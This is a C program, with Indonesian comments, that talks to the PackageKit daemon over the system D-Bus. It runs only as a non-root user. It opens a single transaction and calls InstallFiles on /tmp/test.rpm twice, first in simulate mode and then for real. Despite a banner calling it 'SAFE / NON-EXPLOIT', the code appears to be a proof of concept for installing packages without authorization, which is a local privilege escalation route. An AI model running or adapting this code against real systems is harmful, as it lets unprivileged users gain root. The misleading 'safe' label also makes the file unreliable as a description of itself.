#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <glib.h>
#include <gio/gio.h>

/* --- Konfigurasi Bus --- */
#define PK_BUS_NAME       "org.freedesktop.PackageKit"
#define PK_OBJECT_PATH    "/org/freedesktop/PackageKit"
#define PK_INTERFACE      "org.freedesktop.PackageKit"
#define PK_TRANS_IFACE    "org.freedesktop.PackageKit.Transaction"

/* --- Flags --- */
#define PK_FLAG_NONE      ((guint64)0)
#define PK_FLAG_SIMULATE  ((guint64)(1u << 2))

typedef struct {
    GMainLoop *loop;
} AppContext;

/* --- Signal Callbacks --- */

static void on_finished(GDBusConnection *conn, const gchar *sender, const gchar *path,
                        const gchar *iface, const gchar *signal, GVariant *params, gpointer data) {
    printf("[DEBUG SIGNAL] Finished received\n");
    
    guint32 exit_code, runtime;
    g_variant_get(params, "(uu)", &exit_code, &runtime);
    
    printf("[*] Finished (exit=%u, runtime=%u ms)\n", exit_code, runtime);
    
    AppContext *ctx = (AppContext *)data;
    g_main_loop_quit(ctx->loop);
}

static void on_error(GDBusConnection *conn, const gchar *sender, const gchar *path,
                     const gchar *iface, const gchar *signal, GVariant *params, gpointer data) {
    printf("[DEBUG SIGNAL] ErrorCode received\n");
    
    guint32 code;
    const gchar *details;
    g_variant_get(params, "(u&s)", &code, &details);
    
    printf("[!] Error %u: %s\n", code, details);
}

static void on_status_changed(GDBusConnection *conn, const gchar *sender, const gchar *path,
                              const gchar *iface, const gchar *signal, GVariant *params, gpointer data) {
    printf("[DEBUG SIGNAL] StatusChanged received\n");
    
    guint32 status;
    g_variant_get(params, "(u)", &status);
    
    printf("[*] Status: %u\n", status);
}

/* --- Helper Functions --- */

static char *create_transaction(GDBusConnection *conn) {
    printf("[DEBUG] Creating transaction...\n");
    
    GError *error = NULL;
    GVariant *result = g_dbus_connection_call_sync(
        conn, PK_BUS_NAME, PK_OBJECT_PATH, PK_INTERFACE,
        "CreateTransaction", NULL, G_VARIANT_TYPE("(o)"),
        G_DBUS_CALL_FLAGS_NONE, -1, NULL, &error);

    if (!result) {
        fprintf(stderr, "[-] CreateTransaction failed: %s\n", error->message);
        g_error_free(error);
        return NULL;
    }

    const gchar *tid_ptr;
    g_variant_get(result, "(&o)", &tid_ptr);
    char *tid = g_strdup(tid_ptr);
    g_variant_unref(result);

    printf("[DEBUG] Transaction created: %s\n", tid);
    return tid;
}

static void async_call_done(GObject *source, GAsyncResult *res, gpointer data) {
    printf("[DEBUG] Async callback triggered\n");
    
    GError *error = NULL;
    GVariant *ret = g_dbus_connection_call_finish(G_DBUS_CONNECTION(source), res, &error);

    if (!ret) {
        printf("[DEBUG] Async call FAILED: %s\n", error->message);
        g_error_free(error);
        return;
    }

    printf("[DEBUG] Async call OK\n");
    g_variant_unref(ret);
}

static void install_files(GDBusConnection *conn, const char *tid, guint64 flags, const char *path) {
    const char *package_paths[] = { path, NULL };

    printf("[DEBUG] InstallFiles called -> tid=%s flags=%lu path=%s\n", tid, flags, path);

    g_dbus_connection_call(
        conn, PK_BUS_NAME, tid, PK_TRANS_IFACE,
        "InstallFiles", g_variant_new("(t^as)", flags, package_paths),
        NULL, G_DBUS_CALL_FLAGS_NONE, -1, NULL,
        async_call_done, NULL);
}

/* --- Main Logic --- */

int main(void) {
    puts("═══════════════════════════════════════════════");
    puts(" PackageKit RPM Test (SAFE / NON-EXPLOIT + DEBUG)");
    puts("═══════════════════════════════════════════════\n");

    printf("[DEBUG] Program start\n");

    if (geteuid() == 0) {
        fprintf(stderr, "[-] Jangan jalankan sebagai root\n");
        return 1;
    }

    const char *target_rpm = "/tmp/test.rpm";
    if (access(target_rpm, F_OK) != 0) {
        fprintf(stderr, "[-] File RPM tidak ditemukan: %s\n", target_rpm);
        return 1;
    }

    printf("[*] Using RPM: %s\n", target_rpm);
    printf("[DEBUG] Connecting to system bus...\n");

    GError *error = NULL;
    GDBusConnection *connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        fprintf(stderr, "[-] DBus error: %s\n", error->message);
        g_error_free(error);
        return 1;
    }
    printf("[DEBUG] Connected to system bus\n");

    char *transaction_id = create_transaction(connection);
    if (!transaction_id) return 1;

    AppContext app_ctx;
    app_ctx.loop = g_main_loop_new(NULL, FALSE);

    printf("[DEBUG] Subscribing signals for tid: %s\n", transaction_id);

    /* Subs signals */
    g_dbus_connection_signal_subscribe(connection, PK_BUS_NAME, PK_TRANS_IFACE, "Finished", 
        transaction_id, NULL, 0, on_finished, &app_ctx, NULL);
    g_dbus_connection_signal_subscribe(connection, PK_BUS_NAME, PK_TRANS_IFACE, "ErrorCode", 
        transaction_id, NULL, 0, on_error, NULL, NULL);
    g_dbus_connection_signal_subscribe(connection, PK_BUS_NAME, PK_TRANS_IFACE, "StatusChanged", 
        transaction_id, NULL, 0, on_status_changed, NULL, NULL);

    /* Flow Execution */
    printf("[DEBUG] Step 1 SIMULATE\n");
    install_files(connection, transaction_id, PK_FLAG_SIMULATE, target_rpm);

    printf("[DEBUG] Step 2 REAL CALL\n");
    install_files(connection, transaction_id, PK_FLAG_NONE, target_rpm);

    g_dbus_connection_flush_sync(connection, NULL, NULL);

    printf("[DEBUG] Entering main loop...\n");
    g_main_loop_run(app_ctx.loop);

    printf("[DEBUG] Main loop exited\n");

    g_free(transaction_id);
    g_object_unref(connection);

    return 0;
}
